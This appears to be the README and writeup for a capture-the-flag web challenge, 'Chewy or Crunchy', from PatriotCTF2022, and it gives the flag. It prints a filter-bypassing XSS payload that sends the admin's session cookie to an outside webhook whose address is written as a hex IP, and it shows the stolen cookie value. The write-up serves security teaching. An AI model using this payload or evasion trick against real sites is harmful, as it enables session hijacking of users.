# Chewy or Crunchy

p.s. For testing, go to [INSTALL.md](https://github.com/MasonCompetitiveCyber/PatriotCTF2022-Public/blob/main/Web/Chewy%20or%20Crunchy/INSTALL.md)

### Description
I am in the process of making the next big social media platform but I have a history of implementing software insecurely. If you can get into the admin user, I will give you a flag. Feel free to send me a message, I try to respond quickly! 

### Difficulty
Medium

### Flag
`PCTF{hungry_4_c00ki3s}`

### Hints
Try to steal the session cookie.

### Author
Daniel Getter (NihilistPenguin)

### Tester
None yet

### Writeup

This is an XSS challenge. Sign up and try to send yourself an XSS message:
<p align="center"><img src="https://github.com/MasonCompetitiveCyber/PatriotCTF2022-Public/raw/main/writeup-images/xss_attempt.png" width=40%  height=40%></p>
<p align="center"><img src="https://github.com/MasonCompetitiveCyber/PatriotCTF2022-Public/raw/main/writeup-images/xss_attempt_fail.png" width=40%  height=40%></p>

There is a filter in place, so let's get around it. Let's try this payload: `<svg onload=alert("xss")//`
<p align="center"><img src="https://github.com/MasonCompetitiveCyber/PatriotCTF2022-Public/raw/main/writeup-images/xss_attempt_success.png" width=40%  height=40%></p>

Sweet, let's read our messages to see if we successfully XSS ourselves:
<p align="center"><img src="https://github.com/MasonCompetitiveCyber/PatriotCTF2022-Public/raw/main/writeup-images/xss_alert.png" width=40%  height=40%></p>

Success!

Now we need to craft a payload that steals the admin user session cookie and bypass the filters in place. To receive back a request, I used https://webhook.site/ and received the following unique URL: `http://webhook.site/6db432a0-7984-4146-9fbc-d6278b9f865f`. There is a single period in the address. To get around this, I `ping webhook.site` to get the ip address (46.4.105.116). From here, we can [convert that ip address to hex](https://onlinehextools.com/convert-ip-to-hex), and we get `(0x2e046974)`. If you try going to http://0x2e046974, it will properly resolve to the correct ip address and hostname, which is neat. Our unique URL is now: http://0x2e046974/6db432a0-7984-4146-9fbc-d6278b9f865f. 

Here is the XSS payload: `<svg onload=document['location']="http://0x2e046974/6db432a0-7984-4146-9fbc-d6278b9f865f/?c="+document['cookie']//`

Let's send it to the admin:
<p align="center"><img src="https://github.com/MasonCompetitiveCyber/PatriotCTF2022-Public/raw/main/writeup-images/admin_alert.png" width=40%  height=40%></p>

Let's check our webhook:
<p align="center"><img src="https://github.com/MasonCompetitiveCyber/PatriotCTF2022-Public/raw/main/writeup-images/webhook.png" width=70%  height=70%></p>

Sweet! We got a session cookie:
`.eJwlzj0OwjAMQOG7ZGaInSaxe5nKvwKJqRET4u4UMb7pfe9y5BnrXvaU54pbOR5e9pIYBGOKVgo3wEmOtnUYDORs0TjRRaJnnyQtBrK4WVpvigltxIyxTQ6pfWMFSZ6eQL9Az6lIlbmrXZcW2kkHeMYwwlDFWi7Ia8X510D5fAFFYzCb.YiWMRg.092EULk8J3n8Q__eqbmFDDocCbY`

Let's set this as our session cookie value:
<p align="center"><img src="https://github.com/MasonCompetitiveCyber/PatriotCTF2022-Public/raw/main/writeup-images/set_session_cookie.png" width=30%  height=30%></p>

Reload the page, and voilà! 
<p align="center"><img src="https://github.com/MasonCompetitiveCyber/PatriotCTF2022-Public/raw/main/writeup-images/admin_dropdown.png" width=20%  height=20%></p>

Click into `admin panel` and we have the flag!
<p align="center"><img src="https://github.com/MasonCompetitiveCyber/PatriotCTF2022-Public/raw/main/writeup-images/cookie_flag.png" width=40%  height=40%></p>
